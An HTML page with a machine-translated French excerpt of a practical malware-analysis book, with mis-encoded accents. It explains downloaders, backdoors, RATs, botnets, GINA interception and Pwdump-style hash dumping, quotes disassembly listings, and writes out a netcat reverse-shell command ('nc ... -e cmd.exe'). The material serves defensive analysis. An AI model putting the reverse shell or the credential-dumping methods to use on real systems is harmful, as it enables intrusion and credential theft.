<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üëàüèº üë† ‚õπüèø Le livre "Une autopsie va montrer!" Analyse pratique des malwares ¬ª ‚ûø üíî ü¶å</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="L'analyse du malware ressemble √† un jeu de chat et de souris: pas de r√®gles, la situation est en constante √©volution. Par cons√©quent, dans ce cas, il ...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Le livre "Une autopsie va montrer!" Analyse pratique des malwares ¬ª</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/piter/blog/416143/"> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="><img src="https://habrastorage.org/webt/jk/0g/rv/jk0grvjx0tqi91gqj9v6qmsqahs.jpeg" align="left" alt="image"></a>  L'analyse du malware ressemble √† un jeu de chat et de souris: pas de r√®gles, la situation est en constante √©volution.  Par cons√©quent, dans ce cas, il est logique d'√©tudier uniquement les choses et les algorithmes intemporels.  D√®s que vous √™tes confront√© √† la t√¢che de prot√©ger le r√©seau (ou un millier de r√©seaux), vous proc√©dez √† une telle analyse, et vous ne pouvez tout simplement pas vous passer de ce livre. <br><br><h3>  Programmes de t√©l√©chargement et d'ex√©cution de logiciels </h3><br>  Il existe deux types de logiciels malveillants fr√©quemment rencontr√©s, con√ßus pour t√©l√©charger et ex√©cuter des logiciels.  Les t√©l√©chargeurs (√† ne pas confondre avec les t√©l√©chargeurs du syst√®me) t√©l√©chargent simplement du code malveillant suppl√©mentaire sur Internet et l'ex√©cutent sur un ordinateur local.  Ils sont souvent distribu√©s avec l'exploit.  Ils utilisent g√©n√©ralement deux appels API Windows, l'un apr√®s l'autre, pour t√©l√©charger et ex√©cuter des logiciels malveillants suppl√©mentaires: URLDownloadtoFileA et WinExec. <br><a name="habracut"></a><br>  Le lanceur (lanceur) est un fichier ex√©cutable qui installe des applications malveillantes pour leur ex√©cution cach√©e (imm√©diatement ou apr√®s un certain temps).  Les lanceurs viennent souvent avec le logiciel dont ils ont besoin pour fonctionner.  Nous en discuterons au chapitre 12. <br><br><h4>  Portes d√©rob√©es </h4><br>  Les portes d√©rob√©es sont des programmes qui permettent √† un attaquant d'acc√©der √† l'ordinateur d'une victime.  Ce sont les types de logiciels malveillants les plus d√©tectables, et leur taille et leurs fonctionnalit√©s peuvent varier consid√©rablement.  Le code de porte d√©rob√©e est g√©n√©ralement autonome et ne n√©cessite pas de t√©l√©charger des fichiers infect√©s suppl√©mentaires. <br><br>  Les portes d√©rob√©es interagissent sur Internet de diff√©rentes mani√®res, mais les donn√©es sont g√©n√©ralement transmises via HTTP via le port 80. HTTP constitue la majeure partie du trafic r√©seau sortant, ce qui donne aux logiciels malveillants une excellente occasion de passer inaper√ßus par rapport √† d'autres informations. <br><br>  Au chapitre 14, vous apprendrez √† analyser les portes d√©rob√©es au niveau des paquets, en cr√©ant des signatures r√©seau efficaces.  En attendant, nous nous concentrerons sur l'interaction de haut niveau. <br>  Les portes d√©rob√©es sont livr√©es avec un ensemble standard de fonctions: la possibilit√© de manipuler les cl√©s de registre, de compter les fen√™tres affich√©es, de cr√©er des r√©pertoires, de rechercher des fichiers, etc.Pour comprendre lesquelles sont utilis√©es par la porte d√©rob√©e, vous pouvez v√©rifier les fonctions de l'API Windows qu'elle importe.  L'annexe A fournit une liste de fonctions communes qui d√©crivent ce qu'elles peuvent dire sur le logiciel malveillant. <br><br><h3>  Shell de commande inverse </h3><br>  Un shell de commande inverse est une connexion qui initie un ordinateur infect√©, donnant un acc√®s aux commandes √† un attaquant.  Il peut s'agir d'un programme malveillant distinct ou de l'un des composants d'une porte d√©rob√©e plus complexe.  Dans le shell de commande inverse, un attaquant peut ex√©cuter des commandes comme si tout cela se passait sur son syst√®me local. <br><br><h4>  Netcat Reverse Command Shell </h4><br>  Le programme Netcat dont nous avons discut√© au chapitre 3 peut √™tre utilis√© pour cr√©er un shell de commande si vous l'ex√©cutez sur deux ordinateurs.  Les attaquants l'utilisent souvent eux-m√™mes et le compl√®tent avec d'autres logiciels malveillants. <br>  Pour utiliser Netcat en tant que tel, le syst√®me distant doit attendre les connexions entrantes √† l'aide de la commande suivante: <br><br><pre><code class="hljs nginx"><span class="hljs-attribute"><span class="hljs-attribute">nc</span></span> -l ‚Äìp <span class="hljs-number"><span class="hljs-number">80</span></span></code> </pre> <br>  Le commutateur -l bascule Netcat en mode d'√©coute et le commutateur -p d√©termine le port surveill√©.  Ensuite, l'ordinateur de la victime √©tablit une connexion sortante et fournit son shell de commande: <br><br><pre> <code class="hljs dos">nc _ip <span class="hljs-number"><span class="hljs-number">80</span></span> -e <span class="hljs-built_in"><span class="hljs-built_in">cmd</span></span>.exe</code> </pre> <br>  L'√©couteur IP 80 est l'adresse IP et le port de l'h√¥te distant.  L'option -e vous permet de sp√©cifier le programme qui sera ex√©cut√© lorsque la connexion sera √©tablie.  Ses entr√©es et sorties standard seront li√©es au socket (comme vous le verrez plus tard, Windows utilise souvent cmd.exe). <br><br><h4>  Windows Reverse Shell </h4><br>  Les attaquants utilisent deux impl√©mentations simples du shell de commande inverse bas√©es sur cmd.exe dans Windows: de base et multithread. <br><br>  La m√©thode de base est populaire parmi les auteurs de logiciels malveillants, car elle est plus facile √† mettre en ≈ìuvre et ne fonctionne g√©n√©ralement pas pire qu'une approche multithread.  Il est bas√© sur l'appel de CreateProcess et la modification de la structure STARTUPINFO qui lui est transmise.  Tout d'abord, un socket est cr√©√© et une connexion est √©tablie avec le serveur distant.  Ce socket est ensuite attach√© aux threads standard (flux d'entr√©e, de sortie et d'erreur) du processus cmd.exe.  CreateProcess ex√©cute cmd.exe en mode sans fen√™tre pour le masquer √† la victime.  Le chapitre 7 donne un exemple de cette technique. <br><br>  Une version multithread du shell de commande inverse de Windows implique la cr√©ation d'un socket, de deux canaux et de deux threads (par cons√©quent, vous devez rechercher les appels CreateThread et CreatePipe).  Cette m√©thode est parfois utilis√©e par les auteurs de logiciels malveillants dans le cadre d'une strat√©gie de modification ou d'encodage des donn√©es transmises via un socket.  La fonction CreatePipe peut √™tre utilis√©e pour se lier aux extr√©mit√©s de lecture et d'√©criture du canal, telles que l'entr√©e standard (stdin) et la sortie standard (stdout).  La fonction CreateProcess vous permet de lier des threads standard √† un canal, et non directement √† un socket.  Apr√®s son appel, le malware cr√©era deux threads d'ex√©cution: l'un pour la lecture depuis le canal stdin et l'√©criture dans le socket, et l'autre pour la lecture depuis le socket et l'√©criture vers le canal stdout.  En r√®gle g√©n√©rale, ces threads codent des donn√©es, dont nous parlerons au chapitre 13. En utilisant des m√©thodes de r√©tro-ing√©nierie, vous pouvez examiner les branches dans lesquelles les flux d√©codent les paquets re√ßus pendant une session crypt√©e. <br><br><h3>  Outils d'administration √† distance </h3><br>  Les outils d'administration √† distance (RAT) sont utilis√©s pour contr√¥ler un ou plusieurs ordinateurs sur un r√©seau.  Ils sont souvent impliqu√©s dans des attaques √©troitement cibl√©es - par exemple, lorsqu'ils volent des informations ou se d√©placent d'un ordinateur √† l'autre. <br><br>  Dans la fig.  11.1 montre la structure du r√©seau du RAT.  Le serveur ex√©cut√© sur le syst√®me de la victime est √©quip√© d'un code malveillant.  Le client travaille √† distance car le module de contr√¥le est √† la disposition de l'attaquant.  Les serveurs signalent au client qui les contr√¥le d'ouvrir la connexion.  L'interfonctionnement dans RAT se produit g√©n√©ralement via des ports standard, tels que 80 ou 443. <br><br><div style="text-align:center;"><img src="https://habrastorage.org/webt/kj/7f/px/kj7fpxqhevkd2db817n4rjulxuu.png" alt="image"></div><br><h3>  Botnets </h3><br>  Un botnet est un ensemble de n≈ìuds de r√©seau (zombies) infect√©s qui sont g√©r√©s de mani√®re centralis√©e, g√©n√©ralement √† l'aide d'un serveur appel√© contr√¥leur de botnet.  L'objectif du botnet est d'infecter autant d'ordinateurs que possible et de cr√©er un r√©seau √† grande √©chelle bas√© sur eux, qui peut √™tre utilis√© √† la fois pour propager d'autres logiciels malveillants ou spam, et pour effectuer des attaques DDoS (d√©ni de service distribu√©). )  Si tous les zombies commencent √† attaquer en m√™me temps un certain site, cela peut devenir inaccessible. <br><br><h3>  Comparaison des RAT et des botnets </h3><br>  Il existe plusieurs diff√©rences importantes entre les r√©seaux de zombies et les outils d'administration √† distance. <br><br><ul><li>  Les botnets sont connus pour infecter et contr√¥ler des millions de n≈ìuds.  Les RAT sont g√©n√©ralement ex√©cut√©s par beaucoup moins d'ordinateurs. </li><li>  Tous les participants au botnet sont g√©r√©s simultan√©ment.  RAT vous permet de r√©partir les ressources entre les diff√©rentes victimes, car un attaquant a la possibilit√© d'interagir plus √©troitement avec les syst√®mes infect√©s. </li><li>  Les RAT sont utilis√©s dans des attaques √©troitement cibl√©es, tandis que les botnets se distinguent par leur nombre massif. </li></ul><br><h3>  Vol d'informations d'identification </h3><br>  Les attaquants utilisent souvent toutes sortes de trucs pour voler des informations d'identification.  Cela est particuli√®rement vrai pour les trois types de logiciels malveillants. <br><br><ul><li>  Programmes qui volent les informations d'identification de l'utilisateur au moment o√π il se connecte au syst√®me. </li><li>  Programmes qui copient les informations stock√©es dans Windows (mots de passe, hachages, etc.) pour une utilisation directe ou un d√©cryptage ult√©rieur. </li><li>  Programmes qui enregistrent les frappes. </li></ul><br>  Dans cette section, nous examinons chacun de ces types de logiciels malveillants. <br><br><h3>  Interception GINA </h3><br>  Windows XP utilise une astuce pour voler des informations d'identification, qui consiste √† intercepter GINA (identification graphique et authentification).  Le syst√®me GINA a √©t√© cr√©√© afin de permettre aux applications tierces d'adapter le processus de connexion pour elles-m√™mes, en ajoutant la prise en charge de technologies telles que l'identification par radiofr√©quence (RFID) bas√©e sur des jetons ou des cartes √† puce.  Les auteurs de logiciels malveillants profitent de cette occasion pour t√©l√©charger du code qui d√©robe les informations d'identification. <br><br>  GINA est impl√©ment√© en tant que DLL appel√©e msgina.dll et est charg√© par Winlogon lors de la connexion.  Winlogon prend √©galement en charge les plug-ins tiers, en les chargeant devant la DLL GINA (comme dans une attaque interm√©diaire).  Pour plus de commodit√©, Windows fournit la branche de registre suivante, o√π Winlogon peut rechercher et charger des DLL tierces: <br><br><pre> <code class="hljs tex">HKLM<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">SOFTWARE</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">Microsoft</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">Windows</span></span></span></span> NT<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">CurrentVersion</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">Winlogon</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">GinaDLL</span></span></span></span></code> </pre> <br>  Une fois que nous y avons trouv√© un fichier fsgina.dll infect√©, qui s'est av√©r√© √™tre un intercepteur GINA. <br>  Dans la fig.  La figure 11.2 montre un exemple de la fa√ßon dont les informations de connexion parviennent √† une biblioth√®que malveillante, en passant de Winlogon √† msgina.dll.  Le malware (fsgina.dll) parvient √† intercepter toutes les informations d'identification que l'utilisateur entre lors de l'authentification.  Il peut l'√©crire sur le disque ou le transf√©rer sur le r√©seau. <br><br><div style="text-align:center;"><img src="https://habrastorage.org/webt/ge/eh/ma/geehmaneqdvfmxkmq9-8drvs5cc.png" alt="image"></div><br>  √âtant donn√© que la biblioth√®que fsgina.dll intercepte le flux d'interaction entre Winlogon et GINA, elle doit le transmettre √† msgina.dll pour que le syst√®me continue de fonctionner normalement.  Pour ce faire, le malware doit exporter toutes les fonctions requises par le syst√®me GINA - il y en a plus de 15 et la plupart d'entre elles ont le pr√©fixe Wlx.  De toute √©vidence, si vous trouvez dans la DLL de nombreuses fonctions d'exportation qui commencent par Wlx, vous pouvez tr√®s probablement supposer qu'il s'agit d'un intercepteur GINA. <br><br>  La plupart de ces appels d'exportation acc√®dent √† des fonctions r√©elles dans msgina.dll.  Dans le cas de fsgina.dll, cela s'applique √† toutes les fonctions sauf WlxLoggedOutSAS.  Le listing 11.1 montre l'exportation de WlxLoggedOutSAS vers fsgina.dll. <br><br>  Listing 11.1.  Fonction d'exportation WlxLoggedOutSAS dans la DLL GINA qui enregistre les informations d'identification vol√©es <br><br><pre> <code class="hljs powershell"><span class="hljs-number"><span class="hljs-number">100014</span></span>A0 WlxLoggedOutSAS <span class="hljs-number"><span class="hljs-number">100014</span></span>A0 push esi <span class="hljs-number"><span class="hljs-number">100014</span></span>A1 push edi <span class="hljs-number"><span class="hljs-number">100014</span></span>A2 push offset aWlxloggedout_0 ; <span class="hljs-string"><span class="hljs-string">"WlxLoggedOutSAS"</span></span> <span class="hljs-number"><span class="hljs-number">100014</span></span>A7 call Call_msgina_dll_<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(1)</span></span></span><span class="hljs-function"> ... </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">100014FB</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">push</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">eax</span></span></span><span class="hljs-function"> ; </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">Args</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">100014FC</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">push</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">offset</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">aUSDSPSOpS</span></span></span><span class="hljs-function"> ;"</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">U</span></span></span><span class="hljs-function">: %</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">s</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">D</span></span></span><span class="hljs-function">: %</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">s</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">P</span></span></span><span class="hljs-function">: %</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">s</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">OP</span></span></span><span class="hljs-function">: %</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">s</span></span></span><span class="hljs-function">" </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">10001501</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">push</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">offset</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">aDRIVERS</span></span></span><span class="hljs-function"> ; "</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">drivers</span></span></span><span class="hljs-function">\</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">tcpudp</span></span></span><span class="hljs-function">.</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">sys</span></span></span><span class="hljs-function">" </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">10001503</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">call</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">Log_To_File</span></span></span><span class="hljs-function"> </span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(2)</span></span></span></span></code> </pre> <br>  Les informations d'identification sont imm√©diatement transf√©r√©es dans le fichier msgina.dll √† l'aide d'un appel appel√© Call_msgina_dll_function (1).  Cette fonction localise et lance dynamiquement l'appel WlxLoggedOutSAS √† partir de msgina.dll, qui est sp√©cifi√© comme argument.  Un appel en ligne (2) enregistre des donn√©es.  Comme arguments, il prend des informations comptables, une cha√Æne de format avec laquelle ces informations seront affich√©es et un nom de fichier pour l'enregistrement.  Par cons√©quent, les informations sur toute connexion r√©ussie sont enregistr√©es dans le fichier% SystemRoot% \ system32 \ drivers \ tcpudp.sys.  Ce fichier contient le nom d'utilisateur, le domaine et deux mots de passe - l'actuel et l'ancien. <br><br><h3>  Sauvegarde des hachages </h3><br>  Un logiciel malveillant sous Windows enregistre souvent les hachages du syst√®me pour acc√©der aux informations d'identification.  Apr√®s avoir enregistr√©, les attaquants tentent de d√©crypter ces hachages hors ligne ou de les utiliser pour attaquer comme pass-the-hash.  Au cours de cette attaque, les hachages LM et NTLM sont utilis√©s pour l'authentification NTLM distante, qui ne n√©cessite pas de d√©chiffrement et d'obtention du mot de passe correspondant. <br><br>  Pour √©conomiser les hachages, il existe des packages logiciels Pwdump et Pass-the-Hash (PSH) qui sont gratuits.  √âtant donn√© que ces deux outils sont open source, de nombreux logiciels malveillants ont √©t√© cr√©√©s sur leur base. <br><br>  La plupart des antivirus ont des signatures pour les versions compil√©es standard de ces utilitaires, donc les attaquants essaient souvent de compiler leurs propres variations pour √©viter la d√©tection.  Les exemples de ce chapitre sont les types de pwdump et PSH que nous avons rencontr√©s dans la vie r√©elle. <br><br>  Pwdump est un ensemble de programmes qui g√©n√®rent des hachages au format LM i NTLM appartenant aux utilisateurs locaux √† partir du gestionnaire de comptes de s√©curit√© (SAM).  Pwdump injecte la DLL dans le processus LSASS (service de sous-syst√®me de l'autorit√© de s√©curit√© locale), mieux connu sous le nom de lsass.exe.  Nous discuterons de l'impl√©mentation des DLL dans le chapitre 12, mais pour l'instant, il vous suffit de savoir qu'il s'agit d'une technique par laquelle un malware ex√©cute des biblioth√®ques √† l'int√©rieur d'autres processus, en utilisant tous leurs privil√®ges.  Les outils d'enregistrement des hachages attaquent souvent le processus lsass.exe car il dispose de privil√®ges suffisants et d'un acc√®s √† de nombreuses fonctions API utiles. <br><br>  La version standard de Pwdump utilise la biblioth√®que lsaext.dll.  Lorsqu'il est inject√© dans lsass.exe, il appelle la fonction GetHash, qui est export√©e √† partir de lsaext.dll pour r√©cup√©rer les hachages.  Dans ce cas, des fonctions Windows non document√©es sont utilis√©es, ce qui vous permettra d'obtenir les num√©ros de s√©rie de tous les utilisateurs du syst√®me et les hachages non chiffr√©s du mot de passe pour chacun d'eux. <br><br>  Face √† la variation de Pwdump, vous devez analyser ses biblioth√®ques pour comprendre comment les hachages sont enregistr√©s.  La premi√®re chose que vous devez faire attention aux fonctions d'exportation.  L'appel GetHash est export√© de Pwdump par d√©faut, mais les attaquants peuvent facilement changer son nom pour le rendre moins reconnaissable.  Vous devez ensuite essayer de d√©terminer les fonctions utilis√©es dans les appels d'exportation.  Beaucoup d'entre eux peuvent √™tre localis√©s dynamiquement; par cons√©quent, les appels d'exportation r√©utilisent souvent l'op√©ration GetProcAddress. <br><br>  Le listing 11.2 montre le code de la fonction d'exportation GrabHash de la DLL d'une version de Pwdump.  √âtant donn√© que la biblioth√®que est int√©gr√©e dans lsass.exe, avant d'utiliser de nombreux caract√®res, elle doit d'abord les trouver en mode manuel. <br><br>  Listing 11.2.  Appels API uniques utilis√©s par la fonction d'exportation GrabHash dans l'une des variantes de Pwdump <br><br><pre> <code class="hljs perl"><span class="hljs-number"><span class="hljs-number">1000123</span></span>F <span class="hljs-keyword"><span class="hljs-keyword">push</span></span> offset LibFileName ; <span class="hljs-string"><span class="hljs-string">"samsrv.dll"</span></span> (<span class="hljs-number"><span class="hljs-number">1</span></span>) <span class="hljs-number"><span class="hljs-number">10001244</span></span> call esi ; LoadLibraryA <span class="hljs-number"><span class="hljs-number">10001248</span></span> <span class="hljs-keyword"><span class="hljs-keyword">push</span></span> offset aAdvapi32_dll_<span class="hljs-number"><span class="hljs-number">0</span></span> ; <span class="hljs-string"><span class="hljs-string">"advapi32.dll"</span></span> (<span class="hljs-number"><span class="hljs-number">2</span></span>) ... <span class="hljs-number"><span class="hljs-number">10001251</span></span> call esi ; LoadLibraryA ... <span class="hljs-number"><span class="hljs-number">1000125</span></span>B <span class="hljs-keyword"><span class="hljs-keyword">push</span></span> offset ProcName ; <span class="hljs-string"><span class="hljs-string">"SamIConnect"</span></span> <span class="hljs-number"><span class="hljs-number">10001260</span></span> <span class="hljs-keyword"><span class="hljs-keyword">push</span></span> ebx ; hModule <span class="hljs-number"><span class="hljs-number">10001265</span></span> call esi ; GetProcAddress ... <span class="hljs-number"><span class="hljs-number">10001281</span></span> <span class="hljs-keyword"><span class="hljs-keyword">push</span></span> offset aSamrqu ; <span class="hljs-string"><span class="hljs-string">"SamrQueryInformationUser"</span></span> <span class="hljs-number"><span class="hljs-number">10001286</span></span> <span class="hljs-keyword"><span class="hljs-keyword">push</span></span> ebx ; hModule <span class="hljs-number"><span class="hljs-number">1000128</span></span>C call esi ; GetProcAddress ... <span class="hljs-number"><span class="hljs-number">100012</span></span>C2 <span class="hljs-keyword"><span class="hljs-keyword">push</span></span> offset aSamigetpriv ; <span class="hljs-string"><span class="hljs-string">"SamIGetPrivateData"</span></span> <span class="hljs-number"><span class="hljs-number">100012</span></span>C7 <span class="hljs-keyword"><span class="hljs-keyword">push</span></span> ebx ; hModule <span class="hljs-number"><span class="hljs-number">100012</span></span>CD call esi ; GetProcAddress ... <span class="hljs-number"><span class="hljs-number">100012</span></span>CF <span class="hljs-keyword"><span class="hljs-keyword">push</span></span> offset aSystemfuncti ; <span class="hljs-string"><span class="hljs-string">"SystemFunction025"</span></span> (<span class="hljs-number"><span class="hljs-number">3</span></span>) <span class="hljs-number"><span class="hljs-number">100012</span></span>D4 <span class="hljs-keyword"><span class="hljs-keyword">push</span></span> edi ; hModule <span class="hljs-number"><span class="hljs-number">100012</span></span>DA call esi ; GetProcAddress <span class="hljs-number"><span class="hljs-number">100012</span></span>DC <span class="hljs-keyword"><span class="hljs-keyword">push</span></span> offset aSystemfuni_<span class="hljs-number"><span class="hljs-number">0</span></span> ; <span class="hljs-string"><span class="hljs-string">"SystemFunction027"</span></span> (<span class="hljs-number"><span class="hljs-number">4</span></span>) <span class="hljs-number"><span class="hljs-number">100012</span></span>E1 <span class="hljs-keyword"><span class="hljs-keyword">push</span></span> edi ; hModule <span class="hljs-number"><span class="hljs-number">100012</span></span>E7 call esi ; GetProcAddress</code> </pre> <br>  Le listing 11.2 montre le code pour r√©cup√©rer les descripteurs de biblioth√®que samsrv.dll (1) et advapi32.dll (2) en appelant LoadLibrary.  Le fichier samsrv.dll contient une API pour un acc√®s facile √† SAM et le fichier advapi32.dll a √©t√© trouv√© pour acc√©der √† des fonctions qui n'ont pas √©t√© import√©es dans lsass.exe.  La biblioth√®que dynamique de cette variation Pwdump utilise les descripteurs de ces biblioth√®ques pour rechercher de nombreuses fonctions.  Les cinq plus importants sont indiqu√©s dans la liste (notez les appels GetProcAddress et leurs arguments). <br><br>  Les appels int√©ressants tels que SamIConnect, SamrQueryInformationUser et SamIGetPrivateData sont import√©s de samsrv.dll.  L'appel SamIConnect est ensuite utilis√© pour se connecter √† SAM, apr√®s quoi la fonction SamrQueryInformationUser est appel√©e pour chaque utilisateur du syst√®me. <br><br>  Les hachages sont r√©cup√©r√©s √† l'aide de l'appel SamIGetPrivateData, puis d√©crypt√©s √† l'aide des fonctions SystemFunction025 et SystemFunction027 import√©es depuis advapi32.dll (lignes (2) et (3)).  Aucune des fonctions API de cette liste n'est d√©crite dans la documentation officielle. <br><br>  PSH Toolkit contient des programmes qui cr√©ent des vidages de hachage.  La plus populaire de ces d√©charges est connue sous le nom de whosthere-alt.  Il stocke le contenu SAM obtenu en incorporant la DLL dans lsass.exe.  En m√™me temps, par rapport √† Pwdump, un ensemble compl√®tement diff√©rent de fonctions API est utilis√©.  Le listing 11.3 montre le code de version de whosthere-alt, qui exporte une fonction appel√©e TestDump. <br><br>  Listing 11.3.  Appels API uniques utilis√©s par la fonction d'exportation TestDump de la version whosthere-alt <br><br><pre> <code class="hljs sql">10001119 push offset LibFileName ; "secur32.dll" 1000111E <span class="hljs-keyword"><span class="hljs-keyword">call</span></span> ds:LoadLibraryA <span class="hljs-number"><span class="hljs-number">10001130</span></span> push <span class="hljs-keyword"><span class="hljs-keyword">offset</span></span> ProcName ; "LsaEnumerateLogonSessions" 10001135 push esi ; hModule 10001136 <span class="hljs-keyword"><span class="hljs-keyword">call</span></span> ds:GetProcAddress (<span class="hljs-number"><span class="hljs-number">1</span></span>) ... <span class="hljs-number"><span class="hljs-number">10001670</span></span> <span class="hljs-keyword"><span class="hljs-keyword">call</span></span> ds:GetSystemDirectoryA <span class="hljs-number"><span class="hljs-number">10001676</span></span> mov edi, <span class="hljs-keyword"><span class="hljs-keyword">offset</span></span> aMsv1_0_dll ; \\msv1_0.dll ... 100016A6 push eax ; path to msv1_0.dll 100016A9 <span class="hljs-keyword"><span class="hljs-keyword">call</span></span> ds:GetModuleHandleA (<span class="hljs-number"><span class="hljs-number">2</span></span>)</code> </pre> <br>  √âtant donn√© que cette biblioth√®que est int√©gr√©e dans lsass.exe, sa fonction TestDump cr√©e un vidage de hachage.  Il charge dynamiquement le fichier secur32.dll et y trouve l'appel LsaEnumerateLogonSessions (1) pour obtenir une liste d'identificateurs localement uniques (LUID).  Cette liste contient les noms et domaines qui ont √©t√© indiqu√©s √† chaque connexion.  La biblioth√®que les parcourt pour acc√©der aux informations comptables.  Pour ce faire, √† l'aide d'un appel √† GetModuleHandle (2), elle recherche dans msv1_0.dll une fonction non export√©e, NlpGetPrimaryCredential, qui permet de vider les hachages NT et LM. <br><br><h3>  √Ä propos des auteurs </h3><br>  <b>Michael Sikorski</b> est sp√©cialiste de la s√©curit√© chez Mandiant.  Il est impliqu√© dans l'analyse de logiciels malveillants dans le cadre d'une enqu√™te sur un incident et est consultant aupr√®s du gouvernement am√©ricain pour la s√©curit√© de l'information.  Michael a d√©velopp√© une s√©rie de cours d'analyse de logiciels malveillants et les enseigne √† un public diversifi√©, y compris le FBI et Black Hat.  Avant Mandiant, il √©tait un employ√© du Lincoln Laboratory du Massachusetts Institute of Technology et a men√© des recherches sur la topologie du r√©seau passif et les tests de p√©n√©tration.  De plus, Michael a suivi un programme de formation interdisciplinaire de trois ans sur les syst√®mes et les r√©seaux √† la NSA.  Au cours de sa formation, il a particip√© √† l'√©tude des techniques de reverse engineering et a re√ßu plusieurs prix dans le domaine de l'analyse de r√©seau. <br><br>  <b>Andrew Honig</b> est un expert en s√©curit√© de l'information au d√©partement am√©ricain de la D√©fense.  Il enseigne l'analyse de logiciels, l'ing√©nierie inverse et la programmation pour le syst√®me d'exploitation Windows (OS) √† la National School of Cryptography, tout en √©tant un sp√©cialiste certifi√© en s√©curit√© des syst√®mes d'information.  En raison d'Andrew, plusieurs exploits zero-day pour la virtualisation VMware, ainsi que des outils pour d√©tecter des logiciels malveillants innovants, y compris des modules de noyau infect√©s.  Ayant dix ans d'exp√©rience en tant qu'analyste dans le domaine de la s√©curit√© informatique, il est √† juste titre consid√©r√© comme un expert dans l'analyse et l'interpr√©tation de programmes malveillants et ordinaires. <br><br>  ¬ªPlus d'informations sur le livre sont disponibles sur <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">le site Web de l'√©diteur</a> <br>  ¬ª <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Contenu</a> <br>  ¬ª <a 